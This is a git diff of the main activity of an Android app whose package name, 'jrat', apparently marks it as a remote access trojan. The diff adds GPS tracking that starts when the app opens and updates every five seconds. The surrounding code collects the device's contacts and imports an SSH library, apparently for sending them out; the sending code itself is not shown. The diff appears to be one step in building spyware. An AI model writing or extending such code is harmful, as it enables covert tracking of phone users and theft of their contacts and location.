@@ -2,10 +2,16 @@ package com.julioxus.jrat;
 
 import android.content.ContentResolver;
 import android.database.Cursor;
+import android.location.Address;
+import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.Environment;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.util.Pair;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -17,8 +23,13 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.util.ArrayList;
+import java.util.List;
+import java.util.Locale;
 import java.util.Properties;
 
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationServices;
 import com.jcraft.jsch.*;
 
 public class MainActivity extends AppCompatActivity {
@@ -26,11 +37,18 @@ public class MainActivity extends AppCompatActivity {
 
     //Conctacts list data structure
     ArrayList<Pair<String, String>> contacts = new ArrayList<>();
+    LocationManager mLocationManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        LocationListener locationListener = new MyLocationListener(getBaseContext());
+        mLocationManager.requestLocationUpdates(
+                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+
     }
 
     @Override
@@ -89,7 +107,13 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+
     void sendContacts() throws IOException {
         new SendContactListAsyncTask(this,contacts).execute();
+    }
+
+
+    public void getGeolocation(View view){
+
     }
 }
